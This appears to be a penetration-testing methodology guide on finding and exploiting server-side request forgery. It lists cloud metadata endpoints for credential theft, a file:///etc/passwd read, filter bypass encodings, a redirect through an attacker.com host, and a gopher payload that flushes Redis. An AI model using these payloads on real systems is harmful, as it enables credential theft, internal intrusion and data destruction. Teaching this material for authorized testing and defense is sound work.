# Gaining Access

## Server-Side Request Forgery (SSRF)

SSRF occurs when an application fetches a remote resource (URL, file, webhook, image, PDF export, etc.) without properly validating the destination, allowing an attacker to make the server issue requests to unintended locations — internal services, cloud metadata endpoints, or other internal-only hosts.

**Where to look for it:**
- Parameters that take a URL, hostname, IP, or file path (`url=`, `path=`, `image=`, `callback=`, `webhook=`, `next=`, `dest=`, `redirect=`, `feed=`, `avatar=`)
- Features that fetch remote content server-side: PDF/screenshot generators, URL previewers, webhooks, "import from URL", SSO/OAuth callback validators, XML parsers (XXE-adjacent), file upload from URL

**Basic probing:**

```bash
# Point the parameter at a host you control and watch for the callback
curl "https://target.com/fetch?url=http://<your-collab-server>/probe"
```

Use a listener like `interactsh`, Burp Collaborator, or a simple `nc -lvnp 80` / `python3 -m http.server` on a public IP to confirm out-of-band interaction.

**Blind vs. non-blind SSRF:**
- **Non-blind** — the response of the fetched resource is reflected back in the app (e.g. a URL previewer showing page content). Full read access to whatever the server can reach.
- **Blind** — no response is returned to you, only the fact that a request was made (confirmed via out-of-band callback). Exploitation is limited to side effects: port scanning via response-time/error differences, triggering actions on internal services, or, with metadata endpoints, exfiltrating data indirectly (e.g. forcing the app to email/log the fetched content).

**Common targets once SSRF is confirmed:**

```text
# Cloud metadata endpoints (credential theft)
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS (IMDSv1)
http://169.254.169.254/metadata/v1/                                  # DigitalOcean
http://metadata.google.internal/computeMetadata/v1/                  # GCP (needs Metadata-Flavor: Google header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01     # Azure (needs Metadata: true header)

# Internal network / service scanning
http://127.0.0.1:PORT/
http://localhost:PORT/
http://internal-service.local/

# Local file access (if scheme not restricted)
file:///etc/passwd
```

> **Note:** AWS instances launched since 2024 default to IMDSv2, which requires a session token obtained via a `PUT` request (`X-aws-ec2-metadata-token-ttl-seconds` header) before the metadata endpoint can be read with `GET`. A plain GET-based SSRF will fail against IMDSv2-only instances unless the vulnerable request can also be made to send a `PUT` with custom headers.

**Filter bypass techniques (when a blocklist filters `localhost`/`127.0.0.1`/private ranges):**

- Alternate IP encodings: `http://0177.0.0.1/` (octal), `http://2130706433/` (decimal), `http://0x7f000001/` (hex), `http://127.1/` (short form)
- DNS rebinding: register a domain that resolves to an internal IP
- Redirect chaining: host a redirect (`http://attacker.com/ → http://127.0.0.1/`) if the app follows redirects but only validates the initial URL
- IPv6 loopback: `http://[::1]/`
- Alternate representations: `http://127.0.0.1.nip.io/`, `http://0.0.0.0/`, embedding credentials `http://expected-host@127.0.0.1/`

**Advanced: interacting with non-HTTP internal services**

If the URL scheme isn't restricted, `gopher://` and `dict://` let you craft raw payloads sent byte-for-byte to arbitrary internal TCP services (Redis, Memcached, SMTP, etc.) — useful for turning SSRF into RCE or data exfiltration against services with no auth on the internal network:

```text
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A   # raw Redis command via gopher
dict://127.0.0.1:6379/info                                    # quick service fingerprinting via dict
```

Use [Gopherus](https://github.com/tarunkant/Gopherus) or [SSRFmap](https://github.com/swisskyrepo/SSRFmap) to generate these payloads for common services rather than crafting them by hand.

**Impact to check for:** internal port scanning, reading cloud metadata credentials, hitting internal admin panels, pivoting to other internal services, and (with `file://` support) local file disclosure.
